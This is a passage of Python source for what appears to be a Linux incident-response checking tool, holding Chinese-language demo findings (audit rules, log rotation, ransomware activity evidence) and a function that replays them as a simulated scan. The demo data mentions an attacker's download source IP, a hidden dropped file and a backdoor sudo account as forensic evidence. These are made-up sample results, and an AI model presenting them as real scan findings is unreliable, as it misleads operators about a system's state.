           "在 /etc/audit/rules.d/ir.rules 写入 -w /etc/passwd -p wa -k identity 等关键路径规则",
           "augenrules --load 后用 auditctl -l 复核规则数量 > 0，日志转发到独立日志服务器"], "审计"),
    ],
    "hard.logrotate": [
        F("low", "应用日志未纳入 logrotate 轮转",
          "/var/log/app/app.log 已达 10MB 且权限 644 其他用户可读，同时缺少轮转规则。",
          "644 root:root 10485760 /var/log/app/app.log\napp_logrotate_rules=0",
          ["新建 /etc/logrotate.d/labapp：/var/log/app/*.log { weekly rotate 4 compress missingok notifempty }",
           "chmod 640 /var/log/app/app.log；用 logrotate -d 预演语法后再启用"], "日志轮转"),
    ],
    "log.incident": [
        F("high", "发现事件行为链日志 / 攻击者历史证据",
          "ransom-activity.log 与 attacker_hist 记录了下载源、执行方式与后门账号，是串联根因链的关键证据。",
          "-rw-r--r-- 1 root root 2841 Nov 13 09:12 /var/log/ransom-activity.log\n/root/.history_evidence/attacker_hist\n--- 198.51.100.23 downloader -> /var/tmp/.winlin -> hruser added to sudo ---",
          ["先原样取证到 /root/evidence/ 并计算 sha256，按时间线还原攻击者动作",
           "提取下载源 IP、落地文件名、进程名加入 IOC 清单，横向排查其他主机",
           "关联 webshell C2 / 矿池 / 勒索下载源是否同一地址，判断是否一条攻击链"], "取证链"),
    ],
}


# 这些检查项在演示靶机上结论为「通过」，让报告同时体现已核查且正常的覆盖面
DEMO_PASS_ONLY = [
    "acct.newuser", "persist.at", "persist.worldwrite", "ssh.perms",
    "fore.backup", "hard.umask", "hard.selinux",
]

DEMO_START_LOGS = [
    ("info", "建立 SSH 加密通道  →  opsadmin@10.20.14.37:22"),
    ("ok",   "SSH 认证成功，会话已建立"),
    ("info", "检测到非 root 账号，立即执行  sudo -i  提升至 root …"),
    ("ok",   "提权成功：uid=0 / root，后续检查均在 root 上下文执行"),
    ("info", "目标系统识别：DEBIAN (Ubuntu 16.04.7 LTS)"),
    ("warn", "负载 7.82 / CPU 异常，已进入深度排查模式"),
]


def run_demo(emit, is_stopped):
    """按真实排查顺序重放演示事件。"""
    from checks import CHECKS, finding_method
    for level, text in DEMO_START_LOGS:
        emit("log", {"level": level, "text": text})
        time.sleep(0.12)
    emit("sysinfo", DEMO_SYSINFO)

    total = len(CHECKS)
    count = 0
    methods = {c["id"]: finding_method(c) for c in CHECKS}
    for idx, chk in enumerate(CHECKS):
        if is_stopped():
            break
        emit("check_start", {"id": chk["id"], "module": chk["module"],
                             "name": chk["name"], "index": idx + 1, "total": total})
        emit("log", {"level": "cmd", "text": "[%02d/%02d] %s" % (idx + 1, total, chk["name"])})
        fs = [] if chk["id"] in DEMO_PASS_ONLY else DEMO_FINDINGS.get(chk["id"], [])
        for f in fs:
            item = dict(f)
            item.update({"id": chk["id"], "module": chk["module"], "check": chk["name"],
                         "method": methods[chk["id"]]})
            emit("finding", item)
            count += 1
            time.sleep(0.09)
        if not fs:
            emit("pass", {"id": chk["id"], "module": chk["module"],
                          "check": chk["name"], "note": "未发现异常"})
        emit("check_done", {"id": chk["id"], "count": len(fs)})
        emit("progress", {"done": idx + 1, "total": total,
                          "pct": round((idx + 1) * 100.0 / total, 1)})
        time.sleep(0.13)
    emit("log", {"level": "warn", "text": "排查完成：发现 %d 项风险，建议先隔离网络再按严重级别处置" % count})
    return count
